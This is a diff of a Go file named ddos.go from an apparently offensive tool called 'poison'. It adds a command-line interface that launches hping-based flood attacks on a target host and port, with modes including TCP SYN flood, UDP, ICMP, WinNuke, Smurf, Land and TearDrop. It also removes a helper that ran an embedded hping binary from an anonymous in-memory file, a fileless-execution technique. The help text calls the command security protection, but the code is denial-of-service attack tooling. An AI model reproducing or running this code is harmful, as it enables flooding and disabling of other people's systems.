@@ -1,7 +1,8 @@
-// Package service  -----------------------------
+// Package service -----------------------------
 // @file      : ddos.go
 // @author    : fzf
-// @time      : 2023/5/9 上午10:28
+// @contact   : fzf54122@163.com
+// @time      : 2023/12/8 下午1:23
 // -------------------------------------------
 package service
 
@@ -9,28 +10,57 @@ import (
 	_ "embed"
 	"fmt"
 	logger "github.com/sirupsen/logrus"
-	"golang.org/x/sys/unix"
-	"log"
+	"github.com/spf13/cobra"
 	"os"
 	"os/exec"
 	"os/signal"
+	"poison/src/common"
 	"poison/src/model"
-	"strconv"
+	"poison/src/utils"
 	"syscall"
 )
 
-//go:embed setting/hping
-var content []byte
+var c = make(chan os.Signal, 1)
 
-var (
-	c = make(chan os.Signal, 1) //2表示chan的长度，输入多少次，就可以实现Control+c执行动作多少次
-)
-
-type DDOSStruct struct {
+type DDOSCmd struct {
+	cmd *cobra.Command
 }
 
-func (p *DDOSStruct) Execute(config *model.InterfaceModel) {
-	hping := Generate()
+func (d *DDOSCmd) InitCmd() *cobra.Command {
+	d.cmd = &cobra.Command{
+		Use:       model.DDOS,
+		Short:     "安全防护",
+		Long:      ``,
+		ValidArgs: []string{"-m", "-H", "-P"},
+		Args:      cobra.OnlyValidArgs,
+		Run: func(cmd *cobra.Command, args []string) {
+			if err := utils.CheckFlag(&model.Config); err != nil {
+				logger.Fatalln(err)
+			}
+			logger.Printf("Starting  Host:%s  Mode:%s ...\n", model.Config.DstHost, model.Config.Mode)
+			d.Execute(&model.Config)
+		},
+	}
+	d.cmd.Flags().StringVarP(&model.Config.Mode, "mode", "m", "TCP", "模式载体:TCP、UDP、ICMP、WinNuke、Smurf"+
+		"、Land、TearDrop、MAXICMP")
+	d.cmd.Flags().StringVarP(&model.Config.DstHost, "host", "H", "127.0.0.1", "Host载体")
+	d.cmd.Flags().IntVarP(&model.Config.DstPort, "port", "P", 10086, "端口载体")
+	err := d.cmd.RegisterFlagCompletionFunc(model.MODE, func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
+		return model.PROTOMODE, cobra.ShellCompDirectiveDefault
+	})
+	err = d.cmd.RegisterFlagCompletionFunc(model.HOST, func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
+		return []string{}, cobra.ShellCompDirectiveDefault
+	})
+	err = d.cmd.RegisterFlagCompletionFunc(model.PORT, func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
+		return []string{}, cobra.ShellCompDirectiveDefault
+	})
+	if err != nil {
+	}
+	return d.cmd
+}
+
+func (d *DDOSCmd) Execute(config *model.Stream) {
+	hping := common.Generate()
 	commands := map[string]string{
 		"TCP":      fmt.Sprintf("%s  -c 1000 -d 120 -S -p 10086 --flood %s", hping, config.DstHost),
 		"UDP":      fmt.Sprintf("%s  %s -c 1000 --flood -2 -p 10086", hping, config.DstHost),
@@ -52,17 +82,4 @@ func (p *DDOSStruct) Execute(config *model.InterfaceModel) {
 		logger.Infoln(err)
 	}
 
-}
-
-func Generate() string {
-	fd, err := unix.MemfdCreate("hping", 0)
-	if err != nil {
-		log.Fatal(err)
-	}
-	hping := "/proc/" + strconv.Itoa(os.Getpid()) + "/fd/" + strconv.Itoa(int(fd))
-	err = os.WriteFile(hping, content, 0755)
-	if err != nil {
-		log.Fatal(err)
-	}
-	return hping
 }
